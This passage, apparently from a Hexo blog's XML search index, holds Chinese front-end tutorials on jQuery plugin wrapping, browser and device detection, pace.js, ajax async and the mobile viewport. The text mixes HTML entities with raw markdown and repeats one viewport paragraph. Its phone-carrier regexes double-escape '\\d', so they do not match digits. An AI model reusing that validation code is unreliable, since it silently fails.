&#125;);&#125;)上述开发方法的问题&emsp;&emsp;上面的开发方法存在一个严重的问题，就是定义了一个全局的Haorooms，这样对于插件的兼容等等各个方面都不好。万一别的地方用到了Haorooms，那么你的代码就悲催了！现在我们把上面的代码包装起来，用一个自调用匿名函数(有时又叫块级作用域或者私有作用域)包裹，就不会出现这个问题了！包括js插件的开发，也是一样的，我们用一个自调用匿名函数把自己写的代码包裹起来，就可以了！包裹方法如下：123(function()&#123;&#125;)()用上面的这个包裹起来，就可以了。&emsp;&emsp;但是还有一个问题，当我们研究大牛的代码的时候，前面经常看到有“；”，那是为了避免代码合并等不必要的错误。例如，我们随便定义一个函数：123456var haoroomsblog=function()&#123;&#125;(function()&#123;&#125;)()&emsp;&emsp;由于haoroomsblog这个函数后面没有加分号，导致代码出错，为了避免这类情况的发生，通常这么写！123；(function()&#123;&#125;)()&emsp;&emsp;把你的插件代码包裹在上面里面，就是一个简单的插件了。（注js插件和jquery插件都是如此）还有一个问题把你的插件包裹在123；(function()&#123;&#125;)()&emsp;&emsp;基本上可以说是完美了。但是为了让你开发的插件应用更加广泛，兼容性更加好，还要考虑到用插件的人的一些特殊的做法，例如，有些朋友为了避免jquery和zeptojs冲突，将jquery的前缀“$”,修改为“jQuery”，还有些朋友将默认的document等方法修改。为了让你的插件在这些东西修了了的情况下照常运行，那么我们的做法是，把代码包裹在如下里面：123;(function($,window,document,undefined)&#123;//我们的代码。。&#125;)(jQuery,window,document);就可以避免上面的一些情况了！至此，你开发的插件就算完美了！&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>开发 js或者jquery插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js常见的判断移动端或者pc端或者安卓和苹果浏览器的方法总结]]></title>
    <url>%2F2015%2F10%2F08%2Fjs%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A4%E6%96%AD%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%88%96%E8%80%85pc%E7%AB%AF%E6%88%96%E8%80%85%E5%AE%89%E5%8D%93%E5%92%8C%E8%8B%B9%E6%9E%9C%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[续通过navigator判断浏览器版本或者手机类型，里面介绍了运用navigator判断浏览器类型，在这篇文章基础上做个补充吧！js 判断安卓或者ios 之indexOf方式123456789101112131415161718192021//判断访问终端var browser=&#123;versions:function()&#123;var u = navigator.userAgent, app = navigator.appVersion;return &#123;trident: u.indexOf('Trident') &gt; -1, //IE内核presto: u.indexOf('Presto') &gt; -1, //opera内核webKit: u.indexOf('AppleWebKit') &gt; -1, //苹果、谷歌内核gecko: u.indexOf('Gecko') &gt; -1 &amp;amp;&amp;amp; u.indexOf('KHTML') == -1,//火狐内核mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端android: u.indexOf('Android') &gt; -1 || u.indexOf('Linux') &gt; -1, //android终端或者uc浏览器iPhone: u.indexOf('iPhone') &gt; -1 , //是否为iPhone或者QQHD浏览器iPad: u.indexOf('iPad') &gt; -1, //是否iPadwebApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部weixin: u.indexOf('MicroMessenger') &gt; -1, //是否微信 （2015-01-22新增）qq: u.match(/\sQQ/i) == " qq" //是否QQ&#125;;&#125;(),language:(navigator.browserLanguage || navigator.language).toLowerCase()&#125;&nbsp;使用方法：123456//判断是否IE内核if(browser.versions.trident)&#123; alert("is IE"); &#125;//判断是否webKit内核if(browser.versions.webKit)&#123; alert("is webKit"); &#125;//判断是否移动端if(browser.versions.mobile||browser.versions.android||browser.versions.ios)&#123; alert("移动端"); &#125;&nbsp;js 判断安卓或者ios 之正则表达式方式123456789if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) &#123; //alert(navigator.userAgent); //苹果端&#125; else if (/(Android)/i.test(navigator.userAgent)) &#123; //alert(navigator.userAgent); //安卓端&#125; else &#123; //pc端&#125;;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>判断移动端或者pc端或者安卓和苹果浏览器的方法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过navigator判断浏览器版本或者手机类型]]></title>
    <url>%2F2015%2F10%2F08%2F%E9%80%9A%E8%BF%87navigator%E5%88%A4%E6%96%AD%E6%B5%8F%E8%A7%88%E5%99%A8%E7%89%88%E6%9C%AC%E6%88%96%E8%80%85%E6%89%8B%E6%9C%BA%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[今天来谈谈浏览器navigator属性。&emsp;&emsp;javascript 的navigator属性，不常用，但是用处也不少，主要用处是在做浏览器兼容的问题的时候，现在有的网站已经不兼容IE6，用户假如用IE6浏览网页的话，会提示浏览器升级等信息。或者判断是手机用户还是电脑用户，手机用户调整至手机网站，电脑用户之间跳转至电脑网页等等。首先我们来谈谈navigator属性。你可以在自己电脑上，用复制如下信息，运行一下，看看：123456789101112131415161718192021222324var x = navigator;document.write("CodeName=" + x.appCodeName);document.write("&lt;br/&gt;");document.write("MinorVersion=" + x.appMinorVersion);document.write("&lt;br/&gt;");document.write("Name=" + x.appName);document.write("&lt;br/&gt;");document.write("Version=" + x.appVersion);document.write("&lt;br/&gt;");document.write("CookieEnabled=" + x.cookieEnabled);document.write("&lt;br/&gt;");document.write("CPUClass=" + x.cpuClass);document.write("&lt;br/&gt;");document.write("OnLine=" + x.onLine);document.write("&lt;br/&gt;");document.write("Platform=" + x.platform);document.write("&lt;br/&gt;");document.write("UA=" + x.userAgent);document.write("&lt;br/&gt;");document.write("BrowserLanguage=" + x.browserLanguage);document.write("&lt;br/&gt;");document.write("SystemLanguage=" + x.systemLanguage);document.write("&lt;br/&gt;");document.write("UserLanguage=" + x.userLanguage);我的电脑的运行结果如下：123456789101112CodeName=MozillaMinorVersion=undefinedName=NetscapeVersion=5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36CookieEnabled=trueCPUClass=undefinedOnLine=truePlatform=Win32UA=Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36BrowserLanguage=undefinedSystemLanguage=undefinedUserLanguage=undefined对照一下即可一目了然。根据上面的navigator属性，我们可以来判断浏览器版本了，下面我们一起来做一个例子：页面在IE7一下，提示浏览器升级，其他浏览器正常浏览可以写如下代码：123456789101112if(window.ActiveXObject)&#123;var browser=navigator.appNamevar b_version=navigator.appVersionvar version=b_version.split(";");var trim_Version=version[1].replace(/[ ]/g,"");if(browser=="Microsoft Internet Explorer" &amp;amp;&amp;amp; trim_Version=="MSIE6.0" || trim_Version=="MSIE7.0" )&#123;$(".ie7andie6").show();$(".contentnone").hide();&#125;&#125;html我们可以这么写：12345678910111213&lt;div class="contentnone" style="margin-top:30px;text-align: center;font-size:18px;"&gt;各位亲们，大家好，我在IE8以上可以正常浏览啊！&lt;/div&gt; &lt;div class="ie7andie6 mod-main" style="display:none;"&gt; &lt;div class="tip"&gt; &lt;p&gt;您使用的浏览器版本较低，建议您换用下面这些浏览器试试吧。&lt;/p&gt; &lt;/div&gt; &lt;ul class="clr mod-browsers"&gt; &lt;li&gt;&lt;A class="chrome" href="http://www.google.cn/intl/zh-CN/chrome/" target="_blank"&gt;Chrome&lt;/A&gt; &lt;/li&gt; &lt;li&gt;&lt;A class="ie" href="http://windows.microsoft.com/zh-cn/internet-explorer/ie-10-worldwide-languages" target="_blank"&gt;IE10&lt;/A&gt; &lt;/li&gt; &lt;li&gt;&lt;A class="ff" href="http://firefox.com.cn/" target="_blank"&gt;Firefox&lt;/A&gt; &lt;/li&gt; &lt;/ul&gt; &lt;div class="switch-pic"&gt;&lt;/div&gt;&lt;/div&gt;IE8及其别的版本就可以正常浏览了！另外你也可以用这个方法来判断是手机端用户还是电脑用户：代码如下：123456var a=navigator.userAgent;if(a.indexOf("Android")!=-1 || a.indexOf("iPhone")!=-1 || a.indexOf("iPad")!=-1 )&#123; //跳转到手机网站 &#125;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>navigator判断手机类型</tag>
        <tag>navigator判断浏览器版本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript判断手机号运营商是移动、联通、电信还是其他]]></title>
    <url>%2F2015%2F10%2F07%2Fjavascript%E5%88%A4%E6%96%AD%E6%89%8B%E6%9C%BA%E5%8F%B7%E8%BF%90%E8%90%A5%E5%95%86%E6%98%AF%E7%A7%BB%E5%8A%A8%E3%80%81%E8%81%94%E9%80%9A%E3%80%81%E7%94%B5%E4%BF%A1%E8%BF%98%E6%98%AF%E5%85%B6%E4%BB%96%2F</url>
    <content type="text"><![CDATA[在做WEB项目时，有时候需要根据用户的输入手机号码判断该号的运营商是移动、联通、电信或其他，再根据不同的运营商做出相应的处理，下面介绍js中如何判断手机号的运营商的代码纯js代码12345678910111213141516171819202122232425262728293031323334353637383940414243var isChinaMobile = /^134[0-8]\\d&#123;7&#125;$|^(?:13[5-9]|147|15[0-27-9]|178|18[2-478])\\d&#123;8&#125;$/; //移动方面最新答复 var isChinaUnion = /^(?:13[0-2]|145|15[56]|176|18[56])\\d&#123;8&#125;$/; //向联通微博确认并未回复 var isChinaTelcom = /^(?:133|153|177|18[019])\\d&#123;8&#125;$/; //1349号段 电信方面没给出答复，视作不存在 var isOtherTelphone = /^170([059])\\d&#123;7&#125;$/;//其他运营商var utils=&#123;checkMobile: function(telphone)&#123; telphone = this.trim(telphone); if(telphone.length !== 11)&#123; return this.setReturnJson(false, '未检测到正确的手机号码'); &#125; else&#123; if(isChinaMobile.test(telphone))&#123; return this.setReturnJson(true, '移动', &#123;name: 'ChinaMobile'&#125;); &#125; else if(isChinaUnion.test(telphone))&#123; return this.setReturnJson(true, '联通', &#123;name: 'ChinaUnion'&#125;); &#125; else if(isChinaTelcom.test(telphone))&#123; return this.setReturnJson(true, '电信', &#123;name: 'ChinaTelcom'&#125;); &#125; else if(isOtherTelphone.test(telphone))&#123; var num = isOtherTelphone.exec(telphone); return this.setReturnJson(true, '', &#123;name: ''&#125;); &#125; else&#123; return this.setReturnJson(false, '未检测到正确的手机号码'); &#125; &#125;&#125;,setReturnJson: function(status, msg, data)&#123; if(typeof status !== 'boolean' &amp;&amp; typeof status !== 'number')&#123; status = false; &#125; if(typeof msg !== 'string')&#123; msg = ''; &#125; return&#123; 'status': status, 'msg': msg, 'data': data &#125;;&#125;&#125;以上代码超简单吧，希望对大家学习js判断手机号运行尚有所帮助。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js判断手机号运营商</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pace.js页面加载进度条插件]]></title>
    <url>%2F2015%2F10%2F07%2Fpace-js%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E8%BF%9B%E5%BA%A6%E6%9D%A1%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[在页面中引入 Pace.js 和您所选择主题的 CSS 文件，就可以让你的页面拥有漂亮的加载进度和 Ajax 导航效果。不需要挂接到任何代码，自动检测进展。您可以选择颜色和多种效果，有简约，闪光灯，MAC OSX，左侧填充，顶部填充，计数器和弹跳等等。本文简单介绍插件pace.js.在页面中引入Pace.js，页面就会自动监测你的请求（包括Ajax请求），在事件循环滞后，会在页面记录加载的状态以及进度情况。此插件的兼容性很好，可以兼容IE8以上的所有主流插件，而且其强大之处在于，你还可以引入加载进度条的主题样式，你可以选择任意颜色和多种动画效果（例如简约、闪光灯，MAC OSX，左侧填充，顶部填充，计数器和弹跳等等动画效果），如果你擅长修改css动画，那你就可以做出无限种可能性的动画，为你的网站增添个性化特色！调用方法：引入Pace.js以及主题文件即可：1234&lt;head&gt;&lt;script src="/pace/pace.js"&gt;&lt;/script&gt;&lt;link href="/pace/themes/pace-theme-barber-shop.css" rel="stylesheet" /&gt;&lt;/head&gt;自定义配置：Pace.js会自动加载到页面中，不需要挂接到任何代码，会自动检测进度。如果你想做一些调整，你可以设置window.paceOptions来自定义配置：1234567paceOptions = &#123;// Disable the 'elements' sourceelements: false,// Only show the progress on regular and ajax-y page navigation,// not every requestrestartOnRequestAfter: false&#125;你也可以将自定义设置放到script标签内，例如：1&lt;script data-pace-options='&#123; "ajax": false &#125;' src='pace.js'&gt;&lt;/script&gt;如果你使用AMD或者Browserify来加载模块的话，你可以通过这样子来设置（例如：start）：12345define(['pace'], function(pace)&#123;pace.start(&#123;document: false&#125;);&#125;);使用API：Pace.js公开的API列表：Pace.start：开始显示进度条，如果你不是使用AMD或者Browserify来加载模块的话，这个会默认执行。Pace.restart：进度条重新加载以及显示。Pace.stop：隐藏进度条以及停止加载。Pace.track：监测一个或者多个请求任务。Pace.ignore：忽略一个或者多个请求任务。基本上大致使用方法就这些，还有其他的一些方法的使用，各位就前往到官网去查看更加详细的介绍。希望这个插件可以帮助到大家！查看官网下载附件]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>pace.js</tag>
        <tag>页面加载进度条</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery中的ajax async同步和异步详解]]></title>
    <url>%2F2015%2F10%2F07%2Fjquery%E4%B8%AD%E7%9A%84ajax-async%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[async在jquery ajax中是一个同步参数。本篇文章给大家介绍jq中的ajax async同步和异步。项目中有这样一个需求，使用ajax加载数据返回页面并赋值，然后前端取出该值，这其中涉及到代码的顺序问题，有时后台还未返回数据，但已执行后面代码，所以就会造成取不到值。12345678$.ajax(&#123; type: "post", url: "admin/PfmOptionRuleItem.do", success: function(data) &#123; $("#ruleItem").val(data.ruleItem); //① &#125; &#125;); return $("#ruleItem").val(); //②如果①还未从后台返回数据 此时执行②就获取不到值Ajax的第一个字母是asynchronous的开头字母，这意味着所有的操作都是并行的，完成的顺序没有前后关系。$.ajax()的async参数总是设置成true，这标志着在请求开始后，其他代码依然能够执行。如果把这个选项设置成false，这意味着所有的请求都不再是异步的了，这也会导致浏览器被锁死。虽然官方不建议这么干，只是不能用太多，否则会造成用户体验不佳举个栗子123456789alert("setp 1");$.ajax(&#123; url: "admin/PfmOptionRuleItem.do", async: false, success: function(data) &#123; alert("hello ajax"); //① &#125; &#125;); alert("setp 2"); //②当把asyn设为false时，这时ajax的请求时同步的，也就是说，这个时候ajax块发出请求后，他会等待在①这个地方，不会去向下执行②，直到①执行完毕此时依次执行顺序为setp 1hello ajaxsetp 2如果async为true 则执行顺序为setp 1setp 2hello ajax关于本文给大家叙述的jQuery中的ajax async同步和异步，全部介绍完了，希望对大家有所帮助。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ajax async同步和异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端开发中的2项总结]]></title>
    <url>%2F2015%2F09%2F29%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%842%E9%A1%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1.head直接添加一下js代码：viewport标签12345678910&lt;script&gt;var phoneWidth = parseInt(window.screen.width);var phoneScale = phoneWidth/640;var ua = navigator.userAgent;if (/Android (\d+\.\d+)/.test(ua))&#123;document.write('&lt;meta name="viewport" content="width=640, minimum-scale = '+phoneScale+', maximum-scale = '+phoneScale+', target-densitydpi=device-dpi"&gt;');&#125; else &#123;document.write('&lt;meta name="viewport" content="width=640, user-scalable=no, target-densitydpi=device-dpi" minimal-ui&gt;');&#125;&lt;/script&gt;minimal-ui：iOS 7.1 的 Safari 为 meta 标签新增minimal-ui 属性，在网页加载时隐藏地址栏与导航栏。想了解这些属性，请查看链接：http://www.npm8.com/?p=1786如图:在过去，用 Safari 打开一个网页后是这样的：&emsp;&emsp;始终强调人性化设计的苹果当然注意到了这点，于是在 iOS 7.1 的 Safari 中为 meta 标签新增 minimal-ui 属性，让网页在加载时便可隐藏顶部的地址栏与底部的导航栏。如何实现？你只需将 “minimal-ui” 加入 viewport meta 标签的属性中，比如：name="viewport" content="minimal-ui">```12345678910111213141516**但是：苹果在 iOS 8 中移除了 &apos;minimal-ui&apos;，可能的原因是页面内容不应该能够控制系统的 UI。**&amp;nbsp;## 2.屏幕设备旋转判断&amp;emsp;&amp;emsp;原来屏幕设备旋转判断用js来判断其页面的宽高比例，但是其实css也可以完成这样的功能```html&lt;!--屏幕设备旋转判断开始--&gt;&lt;div id=&quot;orientLayer&quot; class=&quot;mod-orient-layer&quot;&gt;&lt;div class=&quot;mod-orient-layer__content&quot;&gt;&lt;i class=&quot;icon mod-orient-layer__icon-orient&quot;&gt;&lt;/i&gt;&lt;div class=&quot;mod-orient-layer__desc&quot;&gt;为了更好的体验，请使用竖屏浏览&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;!--屏幕设备旋转判断结束--&gt;css样式：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889@-webkit-keyframes rotation &#123;10% &#123;transform: rotate(90deg);-webkit-transform: rotate(90deg)&#125;50%, 60% &#123;transform: rotate(0deg);-webkit-transform: rotate(0deg)&#125;90% &#123;transform: rotate(90deg);-webkit-transform: rotate(90deg)&#125;100% &#123;transform: rotate(90deg);-webkit-transform: rotate(90deg)&#125;&#125;@keyframes rotation &#123;10% &#123;transform: rotate(90deg);-webkit-transform: rotate(90deg)&#125;50%, 60% &#123;transform: rotate(0deg);-webkit-transform: rotate(0deg)&#125;90% &#123;transform: rotate(90deg);-webkit-transform: rotate(90deg)&#125;100% &#123;transform: rotate(90deg);-webkit-transform: rotate(90deg)&#125;&#125;#orientLayer &#123;display: none;&#125;@media screen and (min-aspect-ratio: 13/8) &#123;#orientLayer &#123;display: block;width:100%;height:100%;&#125;&#125;.mod-orient-layer &#123;display: none;position: fixed;height: 100%;width: 100%;left: 0;top: 0;right: 0;bottom: 0;background: #333;z-index: 9997&#125;.mod-orient-layer__content &#123;position: absolute;width: 100%;top: 45%;margin-top: -75px;text-align: center&#125;.mod-orient-layer__icon-orient &#123;background-image: url(../images/icon-orient.png);display: inline-block;width: 67px;height: 109px;transform: rotate(90deg);-webkit-transform: rotate(90deg);-webkit-animation: rotation infinite 1.5s ease-in-out;animation: rotation infinite 1.5s ease-in-out;-webkit-background-size: 67px;background-size: 67px&#125;.mod-orient-layer__desc &#123;margin-top: 20px;font-size: 15px;color: #fff&#125;当屏幕横屏的时候会有如下的效果：]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端开发常用的知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动前端开发之viewport的深入理解]]></title>
    <url>%2F2015%2F09%2F29%2F%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B9%8Bviewport%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在移动设备上进行网页的重构或开发，首先得搞明白的就是移动设备上的viewport了，只有明白了viewport的概念以及弄清楚了跟viewport有关的meta标签的使用，才能更好地让我们的网页适配或响应各种不同分辨率的移动设备。一、viewport的概念&emsp;&emsp;通俗的讲，移动设备上的viewport就是设备的屏幕上能用来显示我们的网页的那一块区域，在具体一点，就是浏览器上(也可能是一个app中的webview)用来显示网页的那部分区域，但viewport又不局限于浏览器可视区域的大小，它可能比浏览器的可视区域要大，也可能比浏览器的可视区域要小。在默认情况下，一般来讲，移动设备上的viewport都是要大于浏览器可视区域的，这是因为考虑到移动设备的分辨率相对于桌面电脑来说都比较小，所以为了能在移动设备上正常显示那些传统的为桌面浏览器设计的网站，移动设备上的浏览器都会把自己默认的viewport设为980px或1024px（也可能是其它值，这个是由设备自己决定的），但带来的后果就是浏览器会出现横向滚动条，因为浏览器可视区域的宽度是比这个默认的viewport的宽度要小的。下图列出了一些设备上浏览器的默认viewport的宽度。二、css中的1px并不等于设备的1px&emsp;&emsp;在css中我们一般使用px作为单位，在桌面浏览器中css的1个像素往往都是对应着电脑屏幕的1个物理像素，这可能会造成我们的一个错觉，那就是css中的像素就是设备的物理像素。但实际情况却并非如此，css中的像素只是一个抽象的单位，在不同的设备或不同的环境中，css中的1px所代表的设备物理像素是不同的。在为桌面浏览器设计的网页中，我们无需对这个津津计较，但在移动设备上，必须弄明白这点。在早先的移动设备中，屏幕像素密度都比较低，如iphone3，它的分辨率为320x480，在iphone3上，一个css像素确实是等于一个屏幕物理像素的。后来随着技术的发展，移动设备的屏幕像素密度越来越高，从iphone4开始，苹果公司便推出了所谓的Retina屏，分辨率提高了一倍，变成640x960，但屏幕尺寸却没变化，这就意味着同样大小的屏幕上，像素却多了一倍，这时，一个css像素是等于两个物理像素的。其他品牌的移动设备也是这个道理。例如安卓设备根据屏幕像素密度可分为ldpi、mdpi、hdpi、xhdpi等不同的等级，分辨率也是五花八门，安卓设备上的一个css像素相当于多少个屏幕物理像素，也因设备的不同而不同，没有一个定论。&emsp;&emsp;还有一个因素也会引起css中px的变化，那就是用户缩放。例如，当用户把页面放大一倍，那么css中1px所代表的物理像素也会增加一倍；反之把页面缩小一倍，css中1px所代表的物理像素也会减少一倍。关于这点，在文章后面的部分还会讲到。&emsp;&emsp;在移动端浏览器中以及某些桌面浏览器中，window对象有一个devicePixelRatio属性，它的官方的定义为：设备物理像素和设备独立像素的比例，也就是 devicePixelRatio = 物理像素 / 独立像素。css中的px就可以看做是设备的独立像素，所以通过devicePixelRatio，我们可以知道该设备上一个css像素代表多少个物理像素。例如，在Retina屏的iphone上，devicePixelRatio的值为2，也就是说1个css像素相当于2个物理像素。但是要注意的是，devicePixelRatio在不同的浏览器中还存在些许的兼容性问题，所以我们现在还并不能完全信赖这个东西，具体的情况可以看下这篇文章。devicePixelRatio的测试结果：三、PPK的关于三个viewport的理论&emsp;&emsp;首先，移动设备上的浏览器认为自己必须能让所有的网站都正常显示，即使是那些不是为移动设备设计的网站。但如果以浏览器的可视区域作为viewport的话，因为移动设备的屏幕都不是很宽，所以那些为桌面浏览器设计的网站放到移动设备上显示时，必然会因为移动设备的viewport太窄，而挤作一团，甚至布局什么的都会乱掉。也许有人会问，现在不是有很多手机分辨率都非常大吗，比如768x1024，或者1080x1920这样，那这样的手机用来显示为桌面浏览器设计的网站是没问题的吧？前面我们已经说了，css中的1px并不是代表屏幕上的1px，你分辨率越大，css中1px代表的物理像素就会越多，devicePixelRatio的值也越大，这很好理解，因为你分辨率增大了，但屏幕尺寸并没有变大多少，必须让css中的1px代表更多的物理像素，才能让1px的东西在屏幕上的大小与那些低分辨率的设备差不多，不然就会因为太小而看不清。所以在1080x1920这样的设备上，在默认情况下，也许你只要把一个div的宽度设为300多px（视devicePixelRatio的值而定），就是满屏的宽度了。回到正题上来，如果把移动设备上浏览器的可视区域设为viewport的话，某些网站就会因为viewport太窄而显示错乱，所以这些浏览器就决定默认情况下把viewport设为一个较宽的值，比如980px，这样的话即使是那些为桌面设计的网站也能在移动浏览器上正常显示了。ppk把这个浏览器默认的viewport叫做 layout viewport。这个layout viewport的宽度可以通过 document.documentElement.clientWidth来获取。&emsp;&emsp;然而，layout viewport 的宽度是大于浏览器可视区域的宽度的，所以我们还需要一个viewport来代表 浏览器可视区域的大小，ppk把这个viewport叫做 visual viewport。visual viewport的宽度可以通window.innerWidth 来获取，但在Android 2, Oprea mini 和 UC 8中无法正确获取。&emsp;&emsp;现在我们已经有两个viewport了：layout viewport 和 visual viewport。但浏览器觉得还不够，因为现在越来越多的网站都会为移动设备进行单独的设计，所以必须还要有一个能完美适配移动设备的viewport。所谓的完美适配指的是，首先不需要用户缩放和横向滚动条就能正常的查看网站的所有内容；第二，显示的文字的大小是合适，比如一段14px大小的文字，不会因为在一个高密度像素的屏幕里显示得太小而无法看清，理想的情况是这段14px的文字无论是在何种密度屏幕，何种分辨率下，显示出来的大小都是差不多的。当然，不只是文字，其他元素像图片什么的也是这个道理。ppk把这个viewport叫做 ideal viewport，也就是第三个viewport——移动设备的理想viewport。&emsp;&emsp;ideal viewport并没有一个固定的尺寸，不同的设备拥有有不同的ideal viewport。所有的iphone的ideal viewport宽度都是320px，无论它的屏幕宽度是320还是640，也就是说，在iphone中，css中的320px就代表iphone屏幕的宽度。&emsp;&emsp;但是安卓设备就比较复杂了，有320px的，有360px的，有384px的等等，关于不同的设备ideal viewport的宽度都为多少，可以到http://viewportsizes.com去查看一下，里面收集了众多设备的理想宽度。&emsp;&emsp;再总结一下：ppk把移动设备上的viewport分为layout viewport 、 visual viewport 和 ideal viewport 三类，其中的ideal viewport是最适合移动设备的viewport，ideal viewport的宽度等于移动设备的屏幕宽度，只要在css中把某一元素的宽度设为ideal viewport的宽度(单位用px)，那么这个元素的宽度就是设备屏幕的宽度了，也就是宽度为100%的效果。ideal viewport 的意义在于，无论在何种分辨率的屏幕下，那些针对ideal viewport 而设计的网站，不需要用户手动缩放，也不需要出现横向滚动条，都可以完美的呈现给用户。四、利用meta标签对viewport进行控制&emsp;&emsp;移动设备默认的viewport是layout viewport，也就是那个比屏幕要宽的viewport，但在进行移动设备网站的开发时，我们需要的是ideal viewport。那么怎么才能得到ideal viewport呢？这就该轮到meta标签出场了。&emsp;&emsp;我们在开发移动设备的网站时，最常见的的一个动作就是把下面这个东西复制到我们的head标签中：name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">```123456789101112131415161718192021222324252627282930313233343536该meta标签的作用是让当前viewport的宽度等于设备的宽度，同时不允许用户手动缩放。也许允不允许用户缩放不同的网站有不同的要求，但让viewport的宽度等于设备的宽度，这个应该是大家都想要的效果，如果你不这样的设定的话，那就会使用那个比屏幕宽的默认viewport，也就是说会出现横向滚动条。&amp;emsp;&amp;emsp;这个name为viewport的meta标签到底有哪些东西呢，又都有什么作用呢？&amp;emsp;&amp;emsp;meta viewport 标签首先是由苹果公司在其safari浏览器中引入的，目的就是解决移动设备的viewport问题。后来安卓以及各大浏览器厂商也都纷纷效仿，引入对meta viewport的支持，事实也证明这个东西还是非常有用的。&amp;emsp;&amp;emsp;在苹果的规范中，meta viewport 有6个属性(暂且把content中的那些东西称为一个个属性和值)，如下：[![7](http://www.npm8.com/wp-content/uploads/2015/09/7-660x129.png)](http://www.npm8.com/wp-content/uploads/2015/09/7.png)&amp;emsp;&amp;emsp;这些属性可以同时使用，也可以单独使用或混合使用，多个属性同时使用时用逗号隔开就行了。&amp;emsp;&amp;emsp;此外，在安卓中还支持 target-densitydpi 这个私有属性，它表示目标设备的密度等级，作用是决定css中的1px代表多少物理像素[![8](http://www.npm8.com/wp-content/uploads/2015/09/81-660x44.png)](http://www.npm8.com/wp-content/uploads/2015/09/81.png)&amp;emsp;&amp;emsp;特别说明的是，当 target-densitydpi=device-dpi 时， css中的1px会等于物理像素中的1px。&amp;emsp;&amp;emsp;因为这个属性只有安卓支持，并且安卓已经决定要废弃target-densitydpi 这个属性了，所以这个属性我们要避免进行使用 。&amp;nbsp;### **五、把当前的viewport宽度设置为 ideal viewport 的宽度**&amp;emsp;&amp;emsp;要得到ideal viewport就必须把默认的layout viewport的宽度设为移动设备的屏幕宽度。因为meta viewport中的width能控制layout viewport的宽度，所以我们只需要把width设为width-device这个特殊的值就行了。`&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;`下图是这句代码在各大移动端浏览器上的测试结果：[![9](http://www.npm8.com/wp-content/uploads/2015/09/9-660x117.png)](http://www.npm8.com/wp-content/uploads/2015/09/9.png)&amp;emsp;&amp;emsp;可以看到通过width=device-width，所有浏览器都能把当前的viewport宽度变成ideal viewport的宽度，但要注意的是，在iphone和ipad上，无论是竖屏还是横屏，宽度都是竖屏时ideal viewport的宽度。&amp;emsp;&amp;emsp;这样的写法看起来谁都会做，没吃过猪肉，谁还没见过猪跑啊~，确实，我们在开发移动设备上的网页时，不管你明不明白什么是viewport，可能你只需要这么一句代码就够了。可是你肯定不知道```&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1&quot;&gt;这句代码也能达到和前一句代码一样的效果，也可以把当前的的viewport变为 ideal viewport。&emsp;&emsp;呵呵，傻眼了吧，因为从理论上来讲，这句代码的作用只是不对当前的页面进行缩放，也就是页面本该是多大就是多大。那为什么会有 width=device-width 的效果呢？&emsp;&emsp;要想清楚这件事情，首先你得弄明白这个缩放是相对于什么来缩放的，因为这里的缩放值是1，也就是没缩放，但却达到了 ideal viewport 的效果，所以，那答案就只有一个了，缩放是相对于 ideal viewport来进行缩放的，当对ideal viewport进行100%的缩放，也就是缩放值为1的时候，不就得到了 ideal viewport吗？事实证明，的确是这样的。下图是各大移动端的浏览器当设置&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1&quot;&gt; 后是否能把当前的viewport宽度变成 ideal viewport 的宽度的测试结果。&emsp;&emsp;可以看到通过width=device-width，所有浏览器都能把当前的viewport宽度变成ideal viewport的宽度，但要注意的是，在iphone和ipad上，无论是竖屏还是横屏，宽度都是竖屏时ideal viewport的宽度。&emsp;&emsp;这样的写法看起来谁都会做，没吃过猪肉，谁还没见过猪跑啊~，确实，我们在开发移动设备上的网页时，不管你明不明白什么是viewport，可能你只需要这么一句代码就够了。可是你肯定不知道name="viewport" 